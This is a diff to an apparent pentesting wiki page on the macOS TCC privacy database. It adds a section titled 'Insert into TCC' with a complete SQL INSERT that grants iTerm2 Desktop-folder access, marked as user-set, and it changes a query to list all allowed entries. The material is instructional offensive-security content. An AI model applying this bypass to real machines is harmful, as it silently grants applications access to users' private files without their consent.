@@ -171,7 +171,7 @@ The TCC **database** stores the **Bundle ID** of the application, but it also **
 {% code overflow="wrap" %}
 ```bash
 # From sqlite
-sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
+sqlite> select service, client, hex(csreq) from access where auth_value=2;
 #Get csreq
 
 # From bash
@@ -246,6 +246,50 @@ Also note that if you move a file that allows the UUID of an app in your compute
 The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.
 
 ## TCC Privesc & Bypasses
+
+### Insert into TCC
+
+If at some point you manage to get write access over a TCC database you can use something like the following to add an entry (remove the comments):
+
+```
+INSERT INTO access (
+    service, 
+    client, 
+    client_type, 
+    auth_value, 
+    auth_reason, 
+    auth_version, 
+    csreq, 
+    policy_id, 
+    indirect_object_identifier_type, 
+    indirect_object_identifier, 
+    indirect_object_code_identity, 
+    flags, 
+    last_modified, 
+    pid, 
+    pid_version, 
+    boot_uuid, 
+    last_reminded
+) VALUES (
+    'kTCCServiceSystemPolicyDesktopFolder', -- service
+    'com.googlecode.iterm2', -- client
+    0, -- client_type (0 - bundle id)
+    2, -- auth_value  (2 - allowed)
+    3, -- auth_reason (3 - "User Set")
+    1, -- auth_version (always 1)
+    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
+    NULL, -- policy_id
+    NULL, -- indirect_object_identifier_type
+    'UNUSED', -- indirect_object_identifier - default value
+    NULL, -- indirect_object_code_identity
+    0, -- flags
+    strftime('%s', 'now'), -- last_modified with default current timestamp
+    NULL, -- assuming pid is an integer and optional
+    NULL, -- assuming pid_version is an integer and optional
+    'UNUSED', -- default value for boot_uuid
+    strftime('%s', 'now') -- last_reminded with default current timestamp
+);
+```
 
 ### Privesc from Automation to FDA
 
